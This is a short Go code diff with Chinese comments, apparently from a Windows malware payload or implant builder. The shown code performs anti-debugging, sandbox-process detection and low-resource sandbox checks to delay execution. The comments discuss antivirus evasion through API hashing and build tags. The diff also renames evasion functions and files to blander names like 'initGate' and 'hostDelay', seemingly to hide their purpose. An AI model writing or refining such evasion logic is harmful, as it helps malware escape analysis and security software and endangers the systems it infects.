@@ -20,9 +20,9 @@ import (
 // 同时它必须静态导入 toolhelp32 API 并携带一批安全软件进程名，绕过了 apihash
 // 免杀路径，属于"为了弱反沙箱能力付出强行为特征"的亏本买卖。
 //
-// 现在该逻辑移入 evasion_scan_windows.go，**只有构建时显式带 evasionscan 标签**
+// 现在该逻辑移入 gate_scan_windows.go，**只有构建时显式带 evasionscan 标签**
 // （生成载荷页的"主动反沙箱进程检测"选项）才参与编译，默认载荷里连字符串都不存在。
-func evasionInit() {
+func initGate() {
 	delay := time.Duration(0)
 
 	// 1. 反调试：IsDebuggerPresent（单次调用，无枚举行为）
@@ -34,7 +34,7 @@ func evasionInit() {
 	}
 
 	// 2. 安全软件/沙箱进程特征：默认关闭（空实现），带 evasionscan 标签才有真实逻辑。
-	delay += evasionSuspectDelay()
+	delay += hostDelay()
 
 	// 3. 资源特征：CPU < 2 核或物理内存 < 2GB（典型沙箱低配配置）
 	if runtime.NumCPU() < 2 {
